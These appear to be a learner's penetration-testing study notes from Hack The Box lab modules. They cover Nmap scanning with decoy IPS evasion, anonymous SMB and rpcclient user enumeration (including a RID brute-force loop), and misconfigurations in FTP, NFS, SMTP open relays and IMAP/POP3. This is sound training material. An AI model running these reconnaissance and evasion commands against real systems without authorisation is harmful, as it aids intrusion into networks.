```bash
c0derpwner@htb[/htb]$ sudo nmap -sS localhost

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-11 22:50 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000010s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5432/tcp open  postgresql
5901/tcp open  vnc-1

Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
```


| **Scanning Options** | **Description**                                                          |
| -------------------- | ------------------------------------------------------------------------ |
| `10.129.2.0/24`      | Target network range.                                                    |
| `-sn`                | Disables port scanning.                                                  |
| `-oA tnet`           | Stores the results in all formats starting with the name 'tnet'.         |
| -`PE`                | Performs the ping scan by using 'ICMP Echo requests' against the target. |
This scanning method works only if the firewalls of the hosts allow it. Otherwise, we can use other scanning techniques to find out if the hosts are active or not. We will take a closer look at these techniques in "`Firewall and IDS Evasion`".

By default, `Nmap` scans the top 1000 TCP ports with the SYN scan (`-sS`). This SYN scan is set only to default when we run it as root because of the socket permissions required to create raw TCP packets. Otherwise, the TCP scan (`-sT`) is performed by default. This means that if we do not define ports and scanning methods, these parameters are set automatically. We can define the ports one by one (`-p 22,25,80,139,445`), by range (`-p 22-445`), by top ports (`--top-ports=10`) from the `Nmap` database that have been signed as most frequent, by scanning all ports (`-p-`) but also by defining a fast port scan, which contains top 100 ports (`-F`).


## Discovering Open UDP Ports

Some system administrators sometimes forget to filter the UDP ports in addition to the TCP ones. Since `UDP` is a `stateless protocol` and does not require a three-way handshake like TCP. We do not receive any acknowledgment. Consequently, the timeout is much longer, making the whole `UDP scan` (`-sU`) much slower than the `TCP scan` (`-sS`).

Let's look at an example of what a UDP scan (`-sU`) can look like and what results it gives us.

#### UDP Port Scan

Host and Port Scanning

```bash
c0derpwner@htb[/htb]$ sudo nmap 10.129.2.28 -F -sU

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-15 16:01 CEST

## Nmap Scripting Engine

---

Nmap Scripting Engine (`NSE`) is another handy feature of `Nmap`. It provides us with the possibility to create scripts in Lua for interaction with certain services. There are a total of 14 categories into which these scripts can be divided:

|**Category**|**Description**|
|---|---|
|`auth`|Determination of authentication credentials.|
|`broadcast`|Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.|
|`brute`|Executes scripts that try to log in to the respective service by brute-forcing with credentials.|
|`default`|Default scripts executed by using the `-sC` option.|
|`discovery`|Evaluation of accessible services.|
|`dos`|These scripts are used to check services for denial of service vulnerabilities and are used less as it harms the services.|
|`exploit`|This category of scripts tries to exploit known vulnerabilities for the scanned port.|
|`external`|Scripts that use external services for further processing.|
|`fuzzer`|This uses scripts to identify vulnerabilities and unexpected packet handling by sending different fields, which can take much time.|
|`intrusive`|Intrusive scripts that could negatively affect the target system.|
|`malware`|Checks if some malware infects the target system.|
|`safe`|Defensive scripts that do not perform intrusive and destructive access.|
|`version`|Extension for service detection.|
|`vuln`|Identification of specific vulnerabilities.|

We have several ways to define the desired scripts in `Nmap`.

use always **`-sC`**  for scriptiin


|                      |                                       |
| -------------------- | ------------------------------------- |
| `10.129.2.28`        | Scans the specified target.           |
| `-p 21,22,25`        | Scans only the specified ports.       |
| `-sS`                | Performs SYN scan on specified ports. |
| `-sA`                | Performs ACK scan on specified ports. |
| `-Pn`                | Disables ICMP Echo requests.          |
| `-n`                 | Disables DNS resolution.              |
| `--disable-arp-ping` | Disables ARP ping.                    |
| `--packet-trace`     | Shows all packets sent and received.  |
| -D:                  |                                       |


### Decoys

There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (`-D`) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (`RND`) a specific number (for example: `5`) of IP addresses separated by a colon (`:`). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.


```bash
sudo nmap 10.129.2.80 -p 10001 -O -D RND:5 --disable-arp-ping -Pn -e tun0
```


 Enumeration Methodology

---

Complex processes must have a standardized methodology that helps us keep our bearings and avoid omitting any aspects by mistake. Especially with the variety of cases that the target systems can offer us, it is almost unpredictable how our approach should be designed. Therefore, most penetration testers follow their habits and the steps they feel most comfortable and familiar with. However, this is not a standardized methodology but rather an experience-based approach.

We know that penetration testing, and therefore enumeration, is a dynamic process. Consequently, we have developed a static enumeration methodology for external and internal penetration tests that includes free dynamics and allows for a wide range of changes and adaptations to the given environment. This methodology is nested in 6 layers and represents, metaphorically speaking, boundaries that we try to pass with the enumeration process. The whole enumeration process is divided into three different levels:

|`Infrastructure-based enumeration`|`Host-based enumeration`|`OS-based enumeration`|
|---|---|---|

![image](https://academy.hackthebox.com/storage/modules/112/enum-method3.png)


These layers are designed as follows:

|**Layer**|**Description**|**Information Categories**|
|---|---|---|
|`1. Internet Presence`|Identification of internet presence and externally accessible infrastructure.|Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures|
|`2. Gateway`|Identify the possible security measures to protect the company's external and internal infrastructure.|Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare|
|`3. Accessible Services`|Identify accessible interfaces and services that are hosted externally or internally.|Service Type, Functionality, Configuration, Port, Version, Interface|
|`4. Processes`|Identify the internal processes, sources, and destinations associated with the services.|PID, Processed Data, Tasks, Source, Destination|
|`5. Privileges`|Identification of the internal permissions and privileges to the accessible services.|Groups, Users, Permissions, Restrictions, Environment|
|`6. OS Setup`|Identification of the internal components and systems setup.|OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files|

Important note: The human aspect and the information that can be obtained by employees using OSINT have been removed from the "Internet Presence" layer for simplicity.

We can finally imagine the entire penetration test in the form of a labyrinth where we have to identify the gaps and find the way to get us inside as quickly and effectively as possible. This type of labyrinth may look something like this:

![image](https://academy.hackthebox.com/storage/modules/112/pentest-labyrinth.png)

The squares represent the gaps/vulnerabilities.

As we have probably already noticed, we can see that we will encounter one gap and very likely several. The interesting and very common fact is that not all the gaps we find can lead us inside. All penetration tests are limited in time, but we should always keep in mind that one belief that there is nearly always a way in. Even after a four-week penetration test, we cannot say 100% that there are no more vulnerabilities. Someone who has been studying the company for months and analyzing them will most likely have a much greater understanding of the applications and structure than we were able to gain within the few weeks we spent on the assessment. An excellent and recent example of this is the [cyber attack on SolarWinds](https://www.rpc.senate.gov/policy-papers/the-solarwinds-cyberattack), which happened not too long ago. This is another excellent reason for a methodology that must exclude such cases.

# FTP


#ftp


The `File Transfer Protocol` (`FTP`) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as `HTTP` or `POP`. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.

Let us imagine that we want to upload local files to a server and download other files using the [FTP](https://datatracker.ietf.org/doc/html/rfc959) protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via `TCP port 20`. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.

A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the `passive mode` has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.

### TFTP

`Trivial File Transfer Protocol` (`TFTP`) is simpler than FTP and performs file transfers between client and server processes. However, it `does not` provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses `UDP`, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.


Let us take a look at a few commands of `TFTP`:

|**Commands**|**Description**|
|---|---|
|`connect`|Sets the remote host, and optionally the port, for file transfers.|
|`get`|Transfers a file or set of files from the remote host to the local host.|
|`put`|Transfers a file or set of files from the local host onto the remote host.|
|`quit`|Exits tftp.|
|`status`|Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.|
|`verbose`|Turns verbose mode, which displays additional information during file transfer, on or off.|

Unlike the FTP client, `TFTP` does not have directory listing functionality.

As soon as we connect to the vsFTPd server, the `response code 220` is displayed with the banner of the FTP server. Often this banner contains the description of the `service` and even the `version` of it. It also tells us what type of system the FTP server is. One of the most common configurations of FTP servers is to allow `anonymous` access, which does not require legitimate credentials but provides access to some files. Even if we cannot download them, sometimes just listing the contents is enough to generate further ideas and note down information that will help us in another approach.

```bash
c0derpwner@htb[/htb]$ ftp 10.129.14.136

# SMB

---
**`Server Message Block` (`SMB`) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. Information exchange between different system processes can also be handled based on the SMB protocol. [SMB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688)** first became available to a broader public, for example, as part of the OS/2 network operating system LAN Manager and LAN Server. Since then, the main application area of the protocol has been the Windows operating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.

An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by `Access Control Lists` (`ACL`). They can be controlled in a fine-grained manner based on attributes such as `execute`, `read`, and `full access` for individual users or user groups. The **ACL** are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.


## Samba
![[smb_protocols.png]]
As mentioned earlier, there is an alternative implementation of the SMB server called Samba, which is developed for Unix-based operating systems. Samba implements the Common Internet File System (`CIFS`) network protocol. [CIFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e) is a dialect of SMB, meaning it is a specific implementation of the SMB protocol originally created by Microsoft. This allows Samba to communicate effectively with newer Windows systems. Therefore, it is often referred to as SMB/CIFS.

However, `CIFS` is considered a specific version of the SMB protocol, primarily aligning with `SMB version 1`. When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports `137`, `138`, and `139`. In contrast, CIFS operates over TCP port `445` exclusively. There are several versions of SMB, including newer versions like `SMB 2` and `SMB 3`, which offer improvements and are preferred in modern infrastructures, while older versions like `SMB 1` (`CIFS`) are considered outdated but may still be used in specific environments.


We see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares. In the individual shares, however, the global settings can be overwritten, which can be configured with high probability even incorrectly. Let us look at some of the settings to understand how the shares are configured in Samba.

|**Setting**|**Description**|
|---|---|
|`[sharename]`|The name of the network share.|
|`workgroup = WORKGROUP/DOMAIN`|Workgroup that will appear when clients query.|
|`path = /path/here/`|The directory to which user is to be given access.|
|`server string = STRING`|The string that will show up when a connection is initiated.|
|`unix password sync = yes`|Synchronize the UNIX password with the SMB password?|
|`usershare allow guests = yes`|Allow non-authenticated users to access defined share?|
|`map to guest = bad user`|What to do when a user login request doesn't match a valid UNIX user?|
|`browseable = yes`|Should this share be shown in the list of available shares?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`read only = yes`|Allow users to read files only?|
|`create mask = 0700`|What permissions need to be set for newly created files?|

---

## Dangerous Settings

Some of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting `browseable = yes` as an example. If we as administrators adopt this setting, the company's employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.

|**Setting**|**Description**|
|---|---|
|`browseable = yes`|Allow listing available shares in the current share?|
|`read only = no`|Forbid the creation and modification of files?|
|`writable = yes`|Allow users to create and modify files?|
|`guest ok = yes`|Allow connecting to the service without using a password?|
|`enable privileges = yes`|Honor privileges assigned to specific SID?|
|`create mask = 0777`|What permissions must be assigned to the newly created files?|
|`directory mask = 0777`|What permissions must be assigned to the newly created directories?|
|`logon script = script.sh`|What script needs to be executed on the user's login?|
|`magic script = script.sh`|Which script should be executed when the script gets closed?|
|`magic output = script.out`|Where the output of the magic script needs to be stored?|

Let us create a share called `[notes]` and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.

```bash

c0derpwner@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)

```
and to connect with notes
```bash
c0derpwner@htb[/htb]$  smbclient //10.129.14.128/notes
```



# RPC


The [Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.


```bash
c0derpwner@htb[/htb]$ rpcclient -U "" 10.129.14.128

Enter WORKGROUP\'s password:
rpcclient $> 
```

The `rpcclient` offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the rpcclient.

|**Query**|**Description**|
|---|---|
|`srvinfo`|Server information.|
|`enumdomains`|Enumerate all domains that are deployed in the network.|
|`querydominfo`|Provides domain, server, and user information of deployed domains.|
|`netshareenumall`|Enumerates all available shares.|
|`netsharegetinfo <share>`|Provides information about a specific share.|
|`enumdomusers`|Enumerates all domain users.|
|`queryuser <RID>`|Provides information about a specific user.|

```bash

c0derpwner@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
    
        User Name   :   c0der
        user_rid :      0x3e8
        group_rid:      0x201
    
        User Name   :   other_User
        user_rid :      0x3e9
        group_rid:      0x201
```
An alternative to this would be a Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).

```bash
samrdump.py 10.129.14.128
```


The information we have already obtained with `rpcclient` can also be obtained using other tools. For example, the [SMBMap](https://github.com/ShawnDEvans/smbmap) and [NetExec](https://github.com/Pennyw0rth/NetExec) tools are also widely used and helpful for the enumeration of SMB services.

# FTP 
#ftp



The `File Transfer Protocol` (`FTP`) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as `HTTP` or `POP`. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol. 
NB: First, the client and server establish a control channel through `TCP port 21`. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via `TCP port 20`. This channel is used exclusively for data transmission.
  A distinction is made between `active` and `passive` FTP. In the active variant, the client establishes the connection as described via TCP port 21 However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the `passive mode` has been developed.

`Trivial File Transfer Protocol` (`TFTP`) is simpler than FTP and performs file transfers between client and server processes. However, it `does not` provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses `UDP`, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.

This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.

# NFS


#nfs #nfs-mount



`Network File System` (`NFS`) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. [NFS](https://en.wikipedia.org/wiki/Network_File_System) is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (`NFSv3`), which has been in use for many years, authenticates the client computer, this changes with `NFSv4`. Here, as with the Windows SMB protocol, the user must authenticate.

|**Version**|**Features**|
|---|---|
|`NFSv2`|It is older but is supported by many systems and was initially operated entirely over UDP.|
|`NFSv3`|It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.|
|`NFSv4`|It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.|

NFS version 4.1 ([RFC 8881](https://datatracker.ietf.org/doc/html/rfc8881)) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port `2049` is used to run the service, which simplifies the use of the protocol across firewalls.

NFS is based on the [Open Network Computing Remote Procedure Call](https://en.wikipedia.org/wiki/Sun_RPC) (`ONC-RPC`/`SUN-RPC`) protocol exposed on `TCP` and `UDP` ports `111`, which uses [External Data Representation](https://en.wikipedia.org/wiki/External_Data_Representation) (`XDR`) for the system-independent exchange of data. The NFS protocol has `no` mechanism for `authentication` or `authorization`. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is derived from the available file system information. In this process, the server is responsible for translating the client's user information into the file system's format and converting the corresponding authorization details into the required UNIX syntax as accurately as possible.

The most common authentication is via UNIX `UID`/`GID` and `group memberships`, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.

## Dangerous Settings

However, even with NFS, some settings can be dangerous for the company and its infrastructure. Here are some of them listed:

|**Option**|**Description**|
|---|---|
|`rw`|Read and write permissions.|
|`insecure`|Ports above 1024 will be used.|
|`nohide`|If another file system was mounted below an exported directory, this directory is exported by its own exports entry.|
|`no_root_squash`|All files created by root are kept with the UID/GID 0.|

It is highly recommended to create a local VM and experiment with the settings. We will discover methods that will show us how the NFS server is configured. For this, we can create several folders and assign different options to each one. Then we can inspect them and see what settings can have what effect on the NFS share and its permissions and the enumeration process.

We can take a look at the `insecure` option. This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.

# DNS

---

`Domain Name System` (`DNS`) is an integral part of the Internet. For example, through domain names, such as `lol.example.com` or **`www.example.com`**, we can reach the web servers that the hosting provider has assigned one or more specific IP addresses. DNS is a system for resolving computer names into IP addresses, and it does not have a central database. Simplified, we can imagine it like a library with many different phone books. The information is distributed over many thousands of name servers. Globally distributed DNS servers translate domain names into IP addresses and thus control which server a user can reach via a particular domain. There are several types of DNS servers that are used worldwide:

- DNS root server
- Authoritative name server
- Non-authoritative name server
- Caching server
- Forwarding server
- Resolver

|**Server Type**|**Description**|
|---|---|
|`DNS Root Server`|The root servers of the DNS are responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The [Internet Corporation for Assigned Names and Numbers](https://www.icann.org/) (`ICANN`) coordinates the work of the root name servers. There are `13` such root servers around the globe.|
|`Authoritative Nameserver`|Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.|
|`Non-authoritative Nameserver`|Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.|
|`Caching DNS Server`|Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.|
|`Forwarding Server`|Forwarding servers perform only one function: they forward DNS queries to another DNS server.|
|`Resolver`|Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.|

DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply `DNS over TLS` (`DoT`) or `DNS over HTTPS` (`DoH`) here. In addition, the network protocol `DNSCrypt` also encrypts the traffic between the computer and the name server.

However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain's name servers are called.


Different `DNS records` are used for the DNS queries, which all have various tasks. Moreover, separate entries exist for different functions since we can set up mail servers and other servers for a domain.

| **DNS Record** | **Description**                                                                                                                                                                                                                                   |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `A`            | Returns an IPv4 address of the requested domain as a result.                                                                                                                                                                                      |
| `AAAA`         | Returns an IPv6 address of the requested domain.                                                                                                                                                                                                  |
| `MX`           | Returns the responsible mail servers as a result.                                                                                                                                                                                                 |
| `NS`           | Returns the DNS servers (nameservers) of the domain.                                                                                                                                                                                              |
| `TXT`          | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam. |
| `CNAME`        | This record serves as an alias for another domain name. If you want the domain www.hackthebox.eu to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for www.hackthebox.eu.               |
| `PTR`          | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.                                                                                                                                     |
| `SOA`          | Provides information about the corresponding DNS zone and email address of the administrative contact.                                                                                                                                            |


The `SOA` record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.

The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is `awsdns-hostmaster@amazon.com`.

For the IP address to be resolved from the `Fully Qualified Domain Name` (`FQDN`), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a `PTR` record. The **PTR** records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.

# SMTP



The `Simple Mail Transfer Protocol` (`SMTP`) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.

By default, SMTP servers accept connection requests on port `25`. However, newer SMTP servers also use other ports such as TCP port `587`. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network.



SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port `25` for the encrypted connection, for example, TCP port `465`.

An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as `Mail User Agent` (`MUA`), converts it into a header and a body and uploads both to the SMTP server. This has a so-called `Mail Transfer Agent` (`MTA`), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a `Mail Submission Agent` (`MSA`), which checks the validity, i.e., the origin of the e-mail. This `MSA` is also called `Relay` server. These are very important later on, as the so-called `Open Relay Attack` can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.

|Client (`MUA`)|`➞`|Submission Agent (`MSA`)|`➞`|Open Relay (`MTA`)|`➞`|Mail Delivery Agent (`MDA`)|`➞`|Mailbox (`POP3`/`IMAP`)|
|---|---|---|---|---|---|---|---|---|


Suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol [DomainKeys](http://dkim.org/) (`DKIM`), the [Sender Policy Framework](https://dmarcian.com/what-is-spf/) (`SPF`).


The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.

|**Command**|**Description**|
|---|---|
|`AUTH PLAIN`|AUTH is a service extension used to authenticate the client.|
|`HELO`|The client logs in with its computer name and thus starts the session.|
|`MAIL FROM`|The client names the email sender.|
|`RCPT TO`|The client names the email recipient.|
|`DATA`|The client initiates the transmission of the email.|

## Dangerous Settings

To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.

Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.

#### Open Relay Configuration

SMTP

```
mynetworks = 0.0.0.0/0
```

With this setting, this SMTP server can send fake emails and thus initialize communication between multiple parties. Another attack possibility would be to spoof the email and read it.

# IMAP / POP3

---

With the help of the `Internet Message Access Protocol` (`IMAP`), access to emails from a mail server is possible. Unlike the `Post Office Protocol` (`POP3`), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.

The client establishes the connection to the server via port `143`. For communication, it uses text-based commands in `ASCII` format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.

SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port `143` or an alternative port such as `993`.

#### IMAP Commands

|**Command**|**Description**|
|---|---|
|`1 LOGIN username password`|User's login.|
|`1 LIST "" *`|Lists all directories.|
|`1 CREATE "INBOX"`|Creates a mailbox with a specified name.|
|`1 DELETE "INBOX"`|Deletes a mailbox.|
|`1 RENAME "ToRead" "Important"`|Renames a mailbox.|
|`1 LSUB "" *`|Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`.|
|`1 SELECT INBOX`|Selects a mailbox so that messages in the mailbox can be accessed.|
|`1 UNSELECT INBOX`|Exits the selected mailbox.|
|`1 FETCH <ID> all`|Retrieves data associated with a message in the mailbox.|
|`1 CLOSE`|Removes all messages with the `Deleted` flag set.|
|`1 LOGOUT`|Closes the connection with the IMAP server.|

#### POP3 Commands

|**Command**|**Description**|
|---|---|
|`USER username`|Identifies the user.|
|`PASS password`|Authentication of the user using its password.|
|`STAT`|Requests the number of saved emails from the server.|
|`LIST`|Requests from the server the number and size of all emails.|
|`RETR id`|Requests the server to deliver the requested email by ID.|
|`DELE id`|Requests the server to delete the requested email by ID.|
|`CAPA`|Requests the server to display the server capabilities.|
|`RSET`|Requests the server to reset the transmitted information.|
|`QUIT`|Closes the connection with the POP3 server.|

## Dangerous Settings

Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:

| **Setting**               | **Description**                                                                          |
| ------------------------- | ---------------------------------------------------------------------------------------- |
| `auth_debug`              | Enables all authentication debug logging.                                                |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                             |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                  |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism |


## Footprinting the Service

By default, ports `110` and `995` are used for POP3, and ports `143` and `993` are used for IMAP. The higher ports (`993` and `995`) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.



```bash
c0derpwner@htb[/htb]$ nmap 10.129.14.128 -sV -p110,143,993,995 -sC

# SNMP

---

`Simple Network Management Protocol` ([SNMP](https://datatracker.ietf.org/doc/html/rfc1157)) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is `SNMPv3`, which increases the security of SNMP in particular, but also the complexity of using this protocol.

In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port `161`. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called `traps` over UDP port `162`. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.

For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.


#### MIB

